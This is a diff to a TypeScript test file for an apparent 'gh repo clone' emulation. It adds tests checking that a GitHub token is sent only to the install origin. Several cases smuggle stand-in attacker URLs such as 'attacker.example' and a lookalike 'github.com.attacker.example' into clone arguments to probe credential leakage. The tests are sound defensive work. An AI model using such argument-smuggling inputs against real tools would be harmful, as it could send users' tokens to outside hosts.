@@ -13,6 +13,8 @@ import * as git from '../git/clone.ts'
 import { GH } from './index.ts'
 
 const WORK = PathSpec.fromStrPath('/w')
+const TOKEN = { Authorization: `Basic ${btoa('x-access-token:secret-never-print')}` }
+const ATTACKER = 'https://attacker.example/x.git'
 
 const require = createRequire(import.meta.url)
 let parser: ShellParser
@@ -24,11 +26,11 @@ beforeAll(async () => {
 })
 afterEach(() => vi.restoreAllMocks())
 
-function clones(): [string[], Context][] {
-  const calls: [string[], Context][] = []
+function clones(): [string[], Context, Readonly<Record<string, string>> | undefined][] {
+  const calls: [string[], Context, Readonly<Record<string, string>> | undefined][] = []
   vi.spyOn(github, 'login').mockResolvedValue('alice')
-  vi.spyOn(git, 'clone').mockImplementation((_config, _paths, texts, ctx) => {
-    calls.push([texts, ctx])
+  vi.spyOn(git, 'clone').mockImplementation((_config, _paths, texts, ctx, credentials) => {
+    calls.push([texts, ctx, credentials])
     return Promise.resolve([null, new IOResult()])
   })
   return calls
@@ -48,7 +50,7 @@ async function run(line: string, base?: string): Promise<ExecuteResult> {
 }
 
 it.each([
-  ['cd /w && gh repo clone o/r', undefined, ['https://github.com/o/r.git', 'r'], { C: WORK }],
+  ['cd /w && gh repo clone o/r', undefined, ['https://github.com/o/r.git'], { C: WORK }],
   [
     'cd /w && gh repo clone https://github.com/o/r.git dest',
     undefined,
@@ -58,18 +60,87 @@ it.each([
   [
     'cd /w && gh repo clone mine -- -q --branch dev',
     undefined,
-    ['https://github.com/alice/mine.git', 'mine'],
+    ['https://github.com/alice/mine.git'],
     { quiet: true, branch: 'dev', C: WORK },
   ],
   [
     'cd /w && gh repo clone ghe.test/o/r',
     'https://ghe.test/api/v3',
-    ['https://ghe.test/o/r.git', 'r'],
+    ['https://ghe.test/o/r.git'],
     { C: WORK },
   ],
 ])('hands git clone the url and flags of %s', async (line, base, texts, flags) => {
   const calls = clones()
   const result = await run(line, base)
   expect([result.exitCode, result.stderr.length]).toEqual([0, 0])
-  expect([calls[0]?.[0], calls[0]?.[1].flags]).toEqual([texts, flags])
+  expect([calls[0]?.[0], calls[0]?.[1].flags, calls[0]?.[2]]).toEqual([texts, flags, TOKEN])
+})
+
+it.each([
+  [
+    'cd /w && gh repo clone o/r -- mydir',
+    ['https://github.com/o/r.git', 'mydir'],
+    { C: WORK },
+    TOKEN,
+  ],
+  ["cd /w && gh repo clone o/r ''", ['https://github.com/o/r.git'], { C: WORK }, TOKEN],
+  [
+    "cd /w && gh repo clone o/r '' -- extra",
+    ['extra', 'https://github.com/o/r.git'],
+    { C: WORK },
+    {},
+  ],
+  [
+    'cd /w && gh repo clone o/r -- -b dev',
+    ['https://github.com/o/r.git'],
+    { branch: 'dev', C: WORK },
+    TOKEN,
+  ],
+  [
+    `cd /w && gh repo clone o/r -- ${ATTACKER}`,
+    ['https://github.com/o/r.git', ATTACKER],
+    { C: WORK },
+    TOKEN,
+  ],
+  [
+    `cd /w && gh repo clone o/r -- -q ${ATTACKER}`,
+    [ATTACKER, 'https://github.com/o/r.git'],
+    { quiet: true, C: WORK },
+    {},
+  ],
+  [
+    `cd /w && gh repo clone o/r ${ATTACKER} -- -b`,
+    [ATTACKER],
+    { branch: 'https://github.com/o/r.git', C: WORK },
+    {},
+  ],
+  [
+    'cd /w && gh repo clone o/r -- -q https://github.com.attacker.example/x.git',
+    ['https://github.com.attacker.example/x.git', 'https://github.com/o/r.git'],
+    { quiet: true, C: WORK },
+    {},
+  ],
+  [
+    'cd /w && gh repo clone o/r -- -q http://github.com/o/r.git',
+    ['http://github.com/o/r.git', 'https://github.com/o/r.git'],
+    { quiet: true, C: WORK },
+    {},
+  ],
+  [
+    'cd /w && gh repo clone o/r -- -q https://github.com/other/x.git',
+    ['https://github.com/other/x.git', 'https://github.com/o/r.git'],
+    { quiet: true, C: WORK },
+    TOKEN,
+  ],
+  [
+    'cd /w && gh repo clone o/r dir -- extra',
+    ['extra', 'https://github.com/o/r.git', 'dir'],
+    { C: WORK },
+    {},
+  ],
+])('sends the token only to the install origin: %s', async (line, texts, flags, credentials) => {
+  const calls = clones()
+  const result = await run(line)
+  expect([result.exitCode, result.stderr.length]).toEqual([0, 0])
+  expect([calls[0]?.[0], calls[0]?.[1].flags, calls[0]?.[2]]).toEqual([texts, flags, credentials])
 })
